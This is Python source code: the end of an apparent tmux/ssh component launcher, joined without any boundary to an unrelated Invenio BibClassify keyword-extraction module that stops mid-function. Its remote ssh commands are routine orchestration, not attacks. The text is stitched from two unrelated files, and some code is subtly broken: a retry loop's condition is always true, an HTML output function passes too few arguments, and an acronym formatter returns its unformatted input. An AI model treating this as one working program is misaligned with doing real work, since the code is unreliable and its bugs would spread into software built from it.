        try:
            node = self.nodes.get('master_node')
            res = []
            unres = []
            dep_resolve(node, res, unres)
            dep_string = ""
            for node in res:
                if node is not master_node:
                    dep_string = "%s -> %s" % (dep_string, node.comp_name)
            self.logger.debug("Dependency tree for start all: %s" % dep_string)
        except CircularReferenceException as ex:
            self.logger.error("Detected circular dependency reference between %s and %s!" % (ex.node1, ex.node2))
            if exit_on_fail:
                exit(1)

    def copy_component_to_remote(self, infile, comp, host):
        self.host_list.append(host)

        self.logger.debug("Saving component to tmp")
        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))
        ensure_dir(tmp_comp_path)
        with open(tmp_comp_path, 'w') as outfile:
            dump(infile, outfile, default_flow_style=False)

        self.logger.debug('Copying component "%s" to remote host "%s"' % (comp, host))
        cmd = ("ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml" %
               (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp))
        self.logger.debug(cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Stop
    ###################
    def stop_component(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug("Stopping remote component '%s' on host '%s'" % (comp['name'], comp['host']))
            self.stop_remote_component(comp['name'], comp['host'])
        else:
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug("window '%s' found running" % comp['name'])
                self.logger.info("Shutting down window...")
                kill_window(window)
                self.logger.info("... done!")

    def stop_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = ("ssh %s 'hyperion --config %s/%s.yaml slave --kill'" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug("Run cmd:\n%s" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Start
    ###################
    def start_component(self, comp):

        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        for node in res:
            self.logger.debug("node name '%s' vs. comp name '%s'" % (node.comp_name, comp['name']))
            if node.comp_name != comp['name']:
                self.logger.debug("Checking and starting %s" % node.comp_name)
                state = self.check_component(node.component)
                if (state is CheckState.STOPPED_BUT_SUCCESSFUL or
                        state is CheckState.STARTED_BY_HAND or
                        state is CheckState.RUNNING):
                    self.logger.debug("Component %s is already running, skipping to next in line" % comp['name'])
                else:
                    self.logger.debug("Start component '%s' as dependency of '%s'" % (node.comp_name, comp['name']))
                    self.start_component_without_deps(node.component)

                    tries = 0
                    while True:
                        self.logger.debug("Checking %s resulted in checkstate %s" % (node.comp_name, state))
                        state = self.check_component(node.component)
                        if (state is not CheckState.RUNNING or
                           state is not CheckState.STOPPED_BUT_SUCCESSFUL):
                            break
                        if tries > 100:
                            return False
                        tries = tries + 1
                        sleep(.5)

        self.logger.debug("All dependencies satisfied, starting '%s'" % (comp['name']))
        state = self.check_component(node.component)
        if (state is CheckState.STARTED_BY_HAND or
                state is CheckState.RUNNING):
            self.logger.debug("Component %s is already running. Skipping start" % comp['name'])
        else:
            self.start_component_without_deps(comp)
        return True

    def start_component_without_deps(self, comp):
        if comp['host'] != 'localhost' and not self.run_on_localhost(comp):
            self.logger.debug("Starting remote component '%s' on host '%s'" % (comp['name'], comp['host']))
            self.start_remote_component(comp['name'], comp['host'])
        else:
            log_file = ("%s/%s" % (TMP_LOG_PATH, comp['name']))
            window = find_window(self.session, comp['name'])

            if window:
                self.logger.debug("Restarting '%s' in old window" % comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])
            else:
                self.logger.info("creating window '%s'" % comp['name'])
                window = self.session.new_window(comp['name'])
                start_window(window, comp['cmd'][0]['start'], log_file, comp['name'])

    def start_remote_component(self, comp_name, host):
        # invoke Hyperion in slave mode on each remote host
        cmd = ("ssh %s 'hyperion --config %s/%s.yaml slave'" % (host, TMP_SLAVE_DIR, comp_name))
        self.logger.debug("Run cmd:\n%s" % cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Check
    ###################
    def check_component(self, comp):
        return check_component(comp, self.session, self.logger)                    

    ###################
    # Dependency management
    ###################
    def get_dep_list(self, comp):
        node = self.nodes.get(comp['name'])
        res = []
        unres = []
        dep_resolve(node, res, unres)
        res.remove(node)

        return res

    ###################
    # Host related checks
    ###################
    def is_localhost(self, hostname):
        try:
            hn_out = socket.gethostbyname(hostname)
            if hn_out == '127.0.0.1' or hn_out == '::1':
                self.logger.debug("Host '%s' is localhost" % hostname)
                return True
            else:
                self.logger.debug("Host '%s' is not localhost" % hostname)
                return False
        except socket.gaierror:
            sys.exit("Host '%s' is unknown! Update your /etc/hosts file!" % hostname)

    def run_on_localhost(self, comp):
        return self.is_localhost(comp['host'])

    ###################
    # TMUX
    ###################
    def kill_remote_session_by_name(self, name, host):
        cmd = "ssh -t %s 'tmux kill-session -t %s'" % (host, name)
        send_main_session_command(self.session, cmd)

    def start_clone_session(self, comp_name, session_name):
        cmd = "%s '%s' '%s'" % (SCRIPT_CLONE_PATH, session_name, comp_name)
        send_main_session_command(self.session, cmd)

    def start_remote_clone_session(self, comp_name, session_name, hostname):
        remote_cmd = ("%s '%s' '%s'" % (SCRIPT_CLONE_PATH, session_name, comp_name))
        cmd = "ssh %s 'bash -s' < %s" % (hostname, remote_cmd)
        send_main_session_command(self.session, cmd)

    ###################
    # Visualisation
    ###################
    def draw_graph(self):
        deps = Digraph("Deps", strict=True)
        deps.graph_attr.update(rankdir="BT")
        try:
            node = self.nodes.get('master_node')

            for current in node.depends_on:
                deps.node(current.comp_name)

                res = []
                unres = []
                dep_resolve(current, res, unres)
                for node in res:
                    if "depends" in node.component:
                        for dep in node.component['depends']:
                            if dep not in self.nodes:
                                deps.node(dep, color="red")
                                deps.edge(node.comp_name, dep, "missing", color="red")
                            elif node.comp_name is not "master_node":
                                deps.edge(node.comp_name, dep)

        except CircularReferenceException as ex:
            self.logger.error("Detected circular dependency reference between %s and %s!" % (ex.node1, ex.node2))
            deps.edge(ex.node1, ex.node2, "circular error", color="red")
            deps.edge(ex.node2, ex.node1, color="red")

        deps.view()


class SlaveLauncher:

    def __init__(self, configfile=None, kill_mode=False, check_mode=False):
        self.kill_mode = kill_mode
        self.check_mode = check_mode
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        self.config = None
        self.session = None
        if kill_mode:
            self.logger.info("started slave with kill mode")
        if check_mode:
            self.logger.info("started slave with check mode")
        self.server = Server()

        if self.server.has_session("slave-session"):
            self.session = self.server.find_where({
                "session_name": "slave-session"
            })

            self.logger.info('found running slave session on server')
        elif not kill_mode and not check_mode:
            self.logger.info('starting new slave session on server')
            self.session = self.server.new_session(
                session_name="slave-session"
            )

        else:
            self.logger.info("No slave session found on server. Aborting")
            exit(CheckState.STOPPED)

        if configfile:
            self.load_config(configfile)
            self.window_name = self.config['name']
            self.flag_path = ("/tmp/Hyperion/slaves/%s" % self.window_name)
            self.log_file = ("/tmp/Hyperion/log/%s" % self.window_name)
            ensure_dir(self.log_file)
        else:
            self.logger.error("No slave component config provided")

    def load_config(self, filename="default.yaml"):
        with open(filename) as data_file:
            self.config = load(data_file, Loader)

    def init(self):
        if not self.config:
            self.logger.error(" Config not loaded yet!")
        elif not self.session:
            self.logger.error(" Init aborted. No session was found!")
        else:
            self.logger.debug(self.config)
            window = find_window(self.session, self.window_name)

            if window:
                self.logger.debug("window '%s' found running" % self.window_name)
                if self.kill_mode:
                    self.logger.info("Shutting down window...")
                    kill_window(window)
                    self.logger.info("... done!")
            elif not self.kill_mode:
                self.logger.info("creating window '%s'" % self.window_name)
                window = self.session.new_window(self.window_name)
                start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name)

            else:
                self.logger.info("There is no component running by the name '%s'. Exiting kill mode" %
                                 self.window_name)

    def run_check(self):
        if not self.config:
            self.logger.error(" Config not loaded yet!")
            exit(CheckState.STOPPED.value)
        elif not self.session:
            self.logger.error(" Init aborted. No session was found!")
            exit(CheckState.STOPPED.value)

        check_state = check_component(self.config, self.session, self.logger)
        exit(check_state.value)

###################
# Component Management
###################
def run_component_check(comp):
    if call(comp['cmd'][1]['check'], shell=True) == 0:
        return True
    else:
        return False


def check_component(comp, session, logger):
    logger.debug("Running component check for %s" % comp['name'])
    check_available = len(comp['cmd']) > 1 and 'check' in comp['cmd'][1]
    window = find_window(session, comp['name'])
    if window:
        pid = get_window_pid(window)
        logger.debug("Found window pid: %s" % pid)

        # May return more child pids if logging is done via tee (which then was started twice in the window too)
        procs = []
        for entry in pid:
            procs.extend(Process(entry).children(recursive=True))
        pids = [p.pid for p in procs]
        logger.debug("Window is running %s child processes" % len(pids))

        # Two processes are tee logging
        # TODO: Change this when more logging options are introduced
        if len(pids) < 3:                    
            logger.debug("Main window process has finished. Running custom check if available")
            if check_available and run_component_check(comp):
                logger.debug("Process terminated but check was successful")
                return CheckState.STOPPED_BUT_SUCCESSFUL
            else:
                logger.debug("Check failed or no check available: returning false")
                return CheckState.STOPPED
        elif check_available and run_component_check(comp):
            logger.debug("Check succeeded")
            return CheckState.RUNNING
        elif not check_available:
            logger.debug("No custom check specified and got sufficient pid amount: returning true")
            return CheckState.RUNNING
        else:
            logger.debug("Check failed: returning false")
            return CheckState.STOPPED
    else:
        logger.debug("%s window is not running. Running custom check" % comp['name'])
        if check_available and run_component_check(comp):
            logger.debug("Component was not started by Hyperion, but the check succeeded")
            return CheckState.STARTED_BY_HAND
        else:
            logger.debug("Window not running and no check command is available or it failed: returning false")
            return CheckState.STOPPED


def get_window_pid(window):
    r = window.cmd('list-panes',
                   "-F #{pane_pid}")
    return [int(p) for p in r.stdout]

###################
# TMUX
###################
def kill_session_by_name(server, name):
    session = server.find_where({
        "session_name": name
    })
    session.kill_session()


def kill_window(window):
    window.cmd("send-keys", "", "C-c")
    window.kill_window()


def start_window(window, cmd, log_file, comp_name):
    setup_log(window, log_file, comp_name)
    window.cmd("send-keys", cmd, "Enter")


def find_window(session, window_name):
    window = session.find_where({
        "window_name": window_name
    })
    return window


def send_main_session_command(session, cmd):
    window = find_window(session, "Main")
    window.cmd("send-keys", cmd, "Enter")


###################
# Logging
###################
def setup_log(window, file, comp_name):
    clear_log(file)
    # Reroute stderr to log file
    window.cmd("send-keys", "exec 2> >(exec tee -i -a '%s')" % file, "Enter")
    # Reroute stdin to log file
    window.cmd("send-keys", "exec 1> >(exec tee -i -a '%s')" % file, "Enter")
    window.cmd("send-keys", ('echo "#Hyperion component start: %s\n$(date)"' % comp_name), "Enter")


def clear_log(file_path):
    if os.path.isfile(file_path):
        os.remove(file_path)


def ensure_dir(file_path):
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)

###################
# Startup
###################
def main():
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser()

    # Create top level parser
    parser.add_argument("--config", '-c', type=str,
                        default='test.yaml',
                        help="YAML config file. see sample-config.yaml. Default: test.yaml")
    subparsers = parser.add_subparsers(dest="cmd")

    # Create parser for the editor command
    subparser_editor = subparsers.add_parser('edit', help="Launches the editor to edit or create new systems and "
                                                          "components")
    # Create parser for the run command
    subparser_run = subparsers.add_parser('run', help="Launches the setup specified by the --config argument")
    # Create parser for validator
    subparser_val = subparsers.add_parser('validate', help="Validate the setup specified by the --config argument")

    subparser_remote = subparsers.add_parser('slave', help="Run a component locally without controlling it. The "
                                                           "control is taken care of the remote master invoking "
                                                           "this command.\nIf run with the --kill flag, the "
                                                           "passed component will be killed")

    subparser_val.add_argument("--visual", help="Generate and show a graph image", action="store_true")

    remote_mutex = subparser_remote.add_mutually_exclusive_group(required=False)

    remote_mutex.add_argument('-k', '--kill', help="switch to kill mode", action="store_true")
    remote_mutex.add_argument('-c', '--check', help="Run a component check", action="store_true")

    args = parser.parse_args()
    logger.debug(args)

    if args.cmd == 'edit':
        logger.debug("Launching editor mode")

    elif args.cmd == 'run':
        logger.debug("Launching runner mode")

        cc = ControlCenter(args.config)
        cc.init()
        start_gui(cc)

    elif args.cmd == 'validate':
        logger.debug("Launching validation mode")
        cc = ControlCenter(args.config)
        if args.visual:
            cc.set_dependencies(False)
            cc.draw_graph()
        else:
            cc.set_dependencies(True)

    elif args.cmd == 'slave':
        logger.debug("Launching slave mode")
        sl = SlaveLauncher(args.config, args.kill, args.check)

        if args.check:
            sl.run_check()
        else:
            sl.init()


###################
# GUI
###################
def start_gui(control_center):
    app = QtGui.QApplication(sys.argv)
    main_window = QtGui.QMainWindow()
    ui = hyperGUI.UiMainWindow()
    ui.ui_init(main_window, control_center)
    main_window.show()
    sys.exit(app.exec_())

# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2007, 2008, 2009, 2010, 2011, 2013, 2014 CERN.
#
# Invenio is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 2 of the
# License, or (at your option) any later version.
#
# Invenio is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Invenio; if not, write to the Free Software Foundation, Inc.,
# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.
"""
BibClassify engine.

This module is the main module of BibClassify. its two main methods are
output_keywords_for_sources and get_keywords_from_text. The first one output
keywords for a list of sources (local files or URLs, PDF or text) while the
second one outputs the keywords for text lines (which are obtained using the
module bibclassify_text_normalizer).

This module also takes care of the different outputs (text, MARCXML or HTML).
But unfortunately there is a confusion between running in a standalone mode
and producing output suitable for printing, and running in a web-based
mode where the webtemplate is used. For the moment the pieces of the representation
code are left in this module.
"""

from __future__ import print_function

import os
from six import iteritems
import config as bconfig

from invenio.legacy.bibclassify import ontology_reader as reader
import text_extractor as extractor
import text_normalizer as normalizer
import keyword_analyzer as keyworder
import acronym_analyzer as acronymer

from invenio.utils.url import make_user_agent_string                    
from invenio.utils.text import encode_for_xml

log = bconfig.get_logger("bibclassify.engine")

# ---------------------------------------------------------------------
#                          API
# ---------------------------------------------------------------------


def output_keywords_for_sources(input_sources, taxonomy_name, output_mode="text",
                                output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,
                                match_mode="full", no_cache=False, with_author_keywords=False,
                                rebuild_cache=False, only_core_tags=False, extract_acronyms=False,
                                api=False, **kwargs):
    """Output the keywords for each source in sources."""

    # Inner function which does the job and it would be too much work to
    # refactor the call (and it must be outside the loop, before it did
    # not process multiple files)
    def process_lines():
        if output_mode == "text":
            print("Input file: %s" % source)

        output = get_keywords_from_text(
            text_lines,
            taxonomy_name,
            output_mode=output_mode,
            output_limit=output_limit,
            spires=spires,
            match_mode=match_mode,
            no_cache=no_cache,
            with_author_keywords=with_author_keywords,
            rebuild_cache=rebuild_cache,
            only_core_tags=only_core_tags,
            extract_acronyms=extract_acronyms
        )
        if api:
            return output
        else:
            if isinstance(output, dict):
                for i in output:
                    print(output[i])

    # Get the fulltext for each source.
    for entry in input_sources:
        log.info("Trying to read input file %s." % entry)
        text_lines = None
        source = ""
        if os.path.isdir(entry):
            for filename in os.listdir(entry):
                if filename.startswith('.'):
                    continue
                filename = os.path.join(entry, filename)
                if os.path.isfile(filename):
                    text_lines = extractor.text_lines_from_local_file(filename)
                    if text_lines:
                        source = filename
                        process_lines()
        elif os.path.isfile(entry):
            text_lines = extractor.text_lines_from_local_file(entry)
            if text_lines:
                source = os.path.basename(entry)
                process_lines()
        else:
            # Treat as a URL.
            text_lines = extractor.text_lines_from_url(entry,                    
                                                       user_agent=make_user_agent_string("BibClassify"))                    
            if text_lines:
                source = entry.split("/")[-1]
                process_lines()


def get_keywords_from_local_file(local_file, taxonomy_name, output_mode="text",
                                 output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,
                                 match_mode="full", no_cache=False, with_author_keywords=False,
                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,
                                 **kwargs):
    """Outputs keywords reading a local file. Arguments and output are the same                    
    as for :see: get_keywords_from_text() """                    

    log.info("Analyzing keywords for local file %s." % local_file)
    text_lines = extractor.text_lines_from_local_file(local_file)

    return get_keywords_from_text(text_lines,
                                  taxonomy_name,
                                  output_mode=output_mode,
                                  output_limit=output_limit,
                                  spires=spires,
                                  match_mode=match_mode,
                                  no_cache=no_cache,
                                  with_author_keywords=with_author_keywords,
                                  rebuild_cache=rebuild_cache,
                                  only_core_tags=only_core_tags,
                                  extract_acronyms=extract_acronyms)


def get_keywords_from_text(text_lines, taxonomy_name, output_mode="text",
                           output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER,
                           spires=False, match_mode="full", no_cache=False,
                           with_author_keywords=False, rebuild_cache=False,
                           only_core_tags=False, extract_acronyms=False,
                           **kwargs):
    """Extract keywords from the list of strings                    

    :param text_lines: list of strings (will be normalized before being
        joined into one string)
    :param taxonomy_name: string, name of the taxonomy_name
    :param output_mode: string - text|html|marcxml|raw
    :param output_limit: int
    :param spires: boolean, if True marcxml output reflect spires codes.
    :param match_mode: str - partial|full; in partial mode only
        beginning of the fulltext is searched.
    :param no_cache: boolean, means loaded definitions will not be saved.
    :param with_author_keywords: boolean, extract keywords from the pdfs.
    :param rebuild_cache: boolean
    :param only_core_tags: boolean
    :return: if output_mode=raw, it will return
        (single_keywords, composite_keywords, author_keywords, acronyms)
        for other output modes it returns formatted string
    """

    cache = reader.get_cache(taxonomy_name)
    if not cache:
        reader.set_cache(taxonomy_name,
                         reader.get_regular_expressions(taxonomy_name,
                                                        rebuild=rebuild_cache,
                                                        no_cache=no_cache))
        cache = reader.get_cache(taxonomy_name)
    _skw = cache[0]
    _ckw = cache[1]
    text_lines = normalizer.cut_references(text_lines)
    fulltext = normalizer.normalize_fulltext("\n".join(text_lines))

    if match_mode == "partial":
        fulltext = _get_partial_text(fulltext)
    author_keywords = None
    if with_author_keywords:
        author_keywords = extract_author_keywords(_skw, _ckw, fulltext)
    acronyms = {}
    if extract_acronyms:
        acronyms = extract_abbreviations(fulltext)

    single_keywords = extract_single_keywords(_skw, fulltext)
    composite_keywords = extract_composite_keywords(_ckw, fulltext, single_keywords)

    if only_core_tags:
        single_keywords = clean_before_output(_filter_core_keywors(single_keywords))
        composite_keywords = _filter_core_keywors(composite_keywords)
    else:
        # Filter out the "nonstandalone" keywords
        single_keywords = clean_before_output(single_keywords)
    return get_keywords_output(single_keywords, composite_keywords, taxonomy_name,
                               author_keywords, acronyms, output_mode, output_limit,
                               spires, only_core_tags)


def extract_single_keywords(skw_db, fulltext):
    """Find single keywords in the fulltext                    
    :var skw_db: list of KeywordToken objects
    :var fulltext: string, which will be searched
    :return : dictionary of matches in a format {
            <keyword object>, [[position, position...], ],
            ..
            }
            or empty {}
    """
    return keyworder.get_single_keywords(skw_db, fulltext) or {}


def extract_composite_keywords(ckw_db, fulltext, skw_spans):
    """Returns a list of composite keywords bound with the number of
    occurrences found in the text string.
    :var ckw_db: list of KewordToken objects (they are supposed to be composite ones)
    :var fulltext: string to search in
    :skw_spans: dictionary of already identified single keywords
    :return : dictionary of matches in a format {
            <keyword object>, [[position, position...], [info_about_matches] ],
            ..
            }
            or empty {}
    """
    return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or {}


def extract_abbreviations(fulltext):
    """Extract acronyms from the fulltext
    :var fulltext: utf-8 string
    :return: dictionary of matches in a formt {
          <keyword object>, [matched skw or ckw object, ....]
          }
          or empty {}
    """
    acronyms = {}
    K = reader.KeywordToken
    for k, v in acronymer.get_acronyms(fulltext).items():
        acronyms[K(k, type='acronym')] = v
    return acronyms


def extract_author_keywords(skw_db, ckw_db, fulltext):
    """Finds out human defined keyowrds in a text string. Searches for
    the string "Keywords:" and its declinations and matches the
    following words.

    :var skw_db: list single kw object
    :var ckw_db: list of composite kw objects
    :var fulltext: utf-8 string
    :return: dictionary of matches in a formt {
          <keyword object>, [matched skw or ckw object, ....]
          }
          or empty {}
    """
    akw = {}
    K = reader.KeywordToken
    for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items():
        akw[K(k, type='author-kw')] = v
    return akw


# ---------------------------------------------------------------------
#                          presentation functions
# ---------------------------------------------------------------------


def get_keywords_output(single_keywords, composite_keywords, taxonomy_name,
                        author_keywords=None, acronyms=None, style="text", output_limit=0,
                        spires=False, only_core_tags=False):
    """Returns a formatted string representing the keywords according
    to the chosen style. This is the main routing call, this function will
    also strip unwanted keywords before output and limits the number
    of returned keywords
    :var single_keywords: list of single keywords
    :var composite_keywords: list of composite keywords
    :var taxonomy_name: string, taxonomy name
    :keyword author_keywords: dictionary of author keywords extracted from fulltext
    :keyword acronyms: dictionary of extracted acronyms
    :keyword style: text|html|marc
    :keyword output_limit: int, number of maximum keywords printed (it applies
            to single and composite keywords separately)
    :keyword spires: boolen meaning spires output style
    :keyword only_core_tags: boolean
    """
    categories = {}
    # sort the keywords, but don't limit them (that will be done later)
    single_keywords_p = _sort_kw_matches(single_keywords)

    composite_keywords_p = _sort_kw_matches(composite_keywords)

    for w in single_keywords_p:
        categories[w[0].concept] = w[0].type
    for w in single_keywords_p:
        categories[w[0].concept] = w[0].type

    complete_output = _output_complete(single_keywords_p, composite_keywords_p,
                                       author_keywords, acronyms, spires,
                                       only_core_tags, limit=output_limit)
    functions = {"text": _output_text, "marcxml": _output_marc, "html":
                 _output_html, "dict": _output_dict}
    my_styles = {}

    for s in style:
        if s != "raw":
            my_styles[s] = functions[s](complete_output, categories)
        else:
            if output_limit > 0:
                my_styles["raw"] = (_kw(_sort_kw_matches(single_keywords, output_limit)),
                                    _kw(_sort_kw_matches(composite_keywords, output_limit)),
                                    author_keywords,  # this we don't limit (?)
                                    _kw(_sort_kw_matches(acronyms, output_limit)))
            else:
                my_styles["raw"] = (single_keywords_p, composite_keywords_p, author_keywords, acronyms)

    return my_styles


def build_marc(recid, single_keywords, composite_keywords,
               spires=False, author_keywords=None, acronyms=None):
    """Create xml record.

    :var recid: ingeter
    :var single_keywords: dictionary of kws
    :var composite_keywords: dictionary of kws
    :keyword spires: please don't use, left for historical
        reasons
    :keyword author_keywords: dictionary of extracted keywords
    :keyword acronyms: dictionary of extracted acronyms
    :return: str, marxml
    """
    output = ['<collection><record>\n'
              '<controlfield tag="001">%s</controlfield>' % recid]

    # no need to sort
    single_keywords = single_keywords.items()
    composite_keywords = composite_keywords.items()

    output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms))

    output.append('</record></collection>')

    return '\n'.join(output)


def _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD,
                 auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD,
                 provenience='BibClassify'):
    """Output the keywords in the MARCXML format.

    :var skw_matches: list of single keywords
    :var ckw_matches: list of composite keywords
    :var author_keywords: dictionary of extracted author keywords
    :var acronyms: dictionary of acronyms
    :var spires: boolean, True=generate spires output - BUT NOTE: it is
            here only not to break compatibility, in fact spires output
            should never be used for xml because if we read marc back
            into the KeywordToken objects, we would not find them
    :keyword provenience: string that identifies source (authority) that
        assigned the contents of the field
    :return: string, formatted MARC"""

    kw_template = ('<datafield tag="%s" ind1="%s" ind2="%s">\n'
                   '    <subfield code="2">%s</subfield>\n'
                   '    <subfield code="a">%s</subfield>\n'
                   '    <subfield code="n">%s</subfield>\n'
                   '    <subfield code="9">%s</subfield>\n'
                   '</datafield>\n')

    output = []

    tag, ind1, ind2 = _parse_marc_code(kw_field)
    for keywords in (output_complete["Single keywords"], output_complete["Core keywords"]):
        for kw in keywords:
            output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),
                                         encode_for_xml(kw), keywords[kw],
                                         encode_for_xml(categories[kw])))

    for field, keywords in ((auth_field, output_complete["Author keywords"]),
                            (acro_field, output_complete["Acronyms"])):
        if keywords and len(keywords) and field:  # field='' we shall not save the keywords
            tag, ind1, ind2 = _parse_marc_code(field)
            for kw, info in keywords.items():
                output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),
                                             encode_for_xml(kw), '', encode_for_xml(categories[kw])))

    return "".join(output)


def _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None,
                     acronyms=None, spires=False, only_core_tags=False,
                     limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER):

    if limit:
        resized_skw = skw_matches[0:limit]
        resized_ckw = ckw_matches[0:limit]
    else:
        resized_skw = skw_matches
        resized_ckw = ckw_matches

    results = {"Core keywords": _get_core_keywords(skw_matches, ckw_matches, spires=spires)}

    if not only_core_tags:
        results["Author keywords"] = _get_author_keywords(author_keywords, spires=spires)
        results["Composite keywords"] = _get_compositekws(resized_ckw, spires=spires)
        results["Single keywords"] = _get_singlekws(resized_skw, spires=spires)
        results["Field codes"] = _get_fieldcodes(resized_skw, resized_ckw, spires=spires)
        results["Acronyms"] = _get_acronyms(acronyms)

    return results


def _output_dict(complete_output, categories):
    return {
        "complete_output": complete_output,
        "categories": categories
    }


def _output_text(complete_output, categories):
    """Output the results obtained in text format.


    :return: str, html formatted output
    """
    output = ""

    for result in complete_output:
        list_result = complete_output[result]
        if list_result:
            list_result_sorted = sorted(list_result, key=lambda x: list_result[x],
                                        reverse=True)
            output += "\n\n{0}:\n".format(result)
            for element in list_result_sorted:
                output += "\n{0} {1}".format(list_result[element], element)

    output += "\n--\n{0}".format(_signature())

    return output


def _output_html(complete_output, categories):
    """Output the same as txt output does, but HTML formatted.

    :var skw_matches: sorted list of single keywords
    :var ckw_matches: sorted list of composite keywords
    :var author_keywords: dictionary of extracted author keywords
    :var acronyms: dictionary of acronyms
    :var spires: boolean
    :var only_core_tags: boolean
    :keyword limit: int, number of printed keywords
    :return: str, html formatted output
    """
    return """<html>
    <head>
      <title>Automatically generated keywords by bibclassify</title>
    </head>
    <body>
    {0}
    </body>
    </html>""".format(
        _output_text(complete_output).replace('\n', '<br>')
    ).replace('\n', '')


def _get_singlekws(skw_matches, spires=False):
    """
    :var skw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: list of formatted keywords
    """
    output = {}
    for single_keyword, info in skw_matches:
        output[single_keyword.output(spires)] = len(info[0])
    return output


def _get_compositekws(ckw_matches, spires=False):
    """
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: list of formatted keywords
    """
    output = {}
    for composite_keyword, info in ckw_matches:
        output[composite_keyword.output(spires)] = {"numbers": len(info[0]),
                                                    "details": info[1]}
    return output


def _get_acronyms(acronyms):
    """Return a formatted list of acronyms."""
    acronyms_str = {}
    if acronyms:
        for acronym, expansions in iteritems(acronyms):
            expansions_str = ", ".join(["%s (%d)" % expansion
                                        for expansion in expansions])
            acronyms_str[acronym] = expansions_str

    return acronyms


def _get_author_keywords(author_keywords, spires=False):
    """Format the output for the author keywords.

    :return: list of formatted author keywors
    """
    out = {}
    if author_keywords:
        for keyword, matches in author_keywords.items():
            skw_matches = matches[0]  # dictionary of single keywords
            ckw_matches = matches[1]  # dict of composite keywords
            matches_str = []
            for ckw, spans in ckw_matches.items():
                matches_str.append(ckw.output(spires))
            for skw, spans in skw_matches.items():
                matches_str.append(skw.output(spires))
            if matches_str:
                out[keyword] = matches_str
            else:
                out[keyword] = 0

    return out


def _get_fieldcodes(skw_matches, ckw_matches, spires=False):
    """Return the output for the field codes.

    :var skw_matches: dict of {keyword: [info,...]}
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: string"""
    fieldcodes = {}
    output = {}

    for skw, _ in skw_matches:
        for fieldcode in skw.fieldcodes:
            fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires))
    for ckw, _ in ckw_matches:

        if len(ckw.fieldcodes):
            for fieldcode in ckw.fieldcodes:
                fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires))
        else:  # inherit field-codes from the composites
            for kw in ckw.getComponents():
                for fieldcode in kw.fieldcodes:
                    fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires))
                    fieldcodes.setdefault('*', set()).add(kw.output(spires))

    for fieldcode, keywords in fieldcodes.items():
        output[fieldcode] = ', '.join(keywords)

    return output


def _get_core_keywords(skw_matches, ckw_matches, spires=False):
    """Return the output for the field codes.

    :var skw_matches: dict of {keyword: [info,...]}
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: set of formatted core keywords
    """
    output = {}
    category = {}

    def _get_value_kw(kw):
        """Help to sort the Core keywords."""
        i = 0
        while kw[i].isdigit():
            i += 1
        if i > 0:
            return int(kw[:i])
        else:
            return 0

    for skw, info in skw_matches:
        if skw.core:
            output[skw.output(spires)] = len(info[0])
            category[skw.output(spires)] = skw.type
    for ckw, info in ckw_matches:
        if ckw.core:
            output[ckw.output(spires)] = len(info[0])
        else:
            #test if one of the components is  not core
            i = 0
            for c in ckw.getComponents():
                if c.core:
                    output[c.output(spires)] = info[1][i]
                i += 1
    return output


def _filter_core_keywors(keywords):
    matches = {}
    for kw, info in keywords.items():
        if kw.core:
            matches[kw] = info
    return matches


def _signature():
    """Print out the bibclassify signature.

    #todo: add information about taxonomy, rdflib"""

    return 'bibclassify v%s' % (bconfig.VERSION,)


def clean_before_output(kw_matches):
    """Return a clean copy of the keywords data structure.

    Stripped off the standalone and other unwanted elements"""
    filtered_kw_matches = {}

    for kw_match, info in iteritems(kw_matches):
        if not kw_match.nostandalone:
            filtered_kw_matches[kw_match] = info

    return filtered_kw_matches

# ---------------------------------------------------------------------
#                          helper functions
# ---------------------------------------------------------------------


def _skw_matches_comparator(kw0, kw1):
    """
    Compare 2 single keywords objects.

